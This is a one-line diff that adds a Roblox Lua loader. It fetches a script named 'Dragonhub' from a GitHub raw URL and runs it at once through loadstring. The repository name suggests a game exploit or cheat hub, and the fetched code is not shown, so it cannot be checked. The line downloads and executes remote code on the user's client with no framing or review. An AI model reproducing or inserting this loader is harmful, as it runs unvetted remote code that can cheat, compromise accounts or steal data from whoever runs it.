@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/thiennhannguyentran695-lab/Dragonhub/refs/heads/main/Dragonhub"))()
